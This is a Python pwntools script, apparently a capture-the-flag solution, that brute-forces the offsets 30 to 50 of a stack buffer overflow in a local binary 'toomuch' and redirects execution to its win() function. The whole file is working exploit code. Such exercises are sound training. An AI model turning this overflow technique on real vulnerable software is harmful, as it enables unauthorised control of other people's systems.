from pwn import *
import subprocess

# Configure pwntools for the target binary
binary = './toomuch'  # Path to the binary
elf = ELF(binary)

# Address of the win() function
win_addr = elf.symbols['win']  # Automatically extract from binary

# Range of offsets to try
min_offset = 30
max_offset = 50

# Log settings
context.log_level = 'debug'  # Set to 'info' or 'error' to reduce verbosity

for offset in range(min_offset, max_offset + 1):
    # Craft the payload
    padding = b'A' * offset
    payload = padding + p64(win_addr)
    
    # Start the process
    p = process(binary)
    
    # Receive the initial output
    try:
        p.recvuntil(b"Buffer: ")
    except EOFError:
        # If the program exits prematurely
        p.close()
        continue
    
    # Send the payload
    p.sendline(payload)
    
    # Try to receive the output after sending the payload
    try:
        output = p.recvall(timeout=1)
    except EOFError:
        output = b''
    
    p.close()
    
    # Check if the exploit was successful by looking for the success message
    if b"*** Winner Winner Chicken Dinner! ***" in output:
        print(f"[*] Success with offset: {offset}")
        print(f"[*] Payload: {payload}")
        print(f"[*] Output:\n{output.decode(errors='ignore')}")
        break
    else:
        print(f"[!] Failed with offset: {offset}")
else:
    print("[!] Exploit failed: No successful offset found in the specified range.")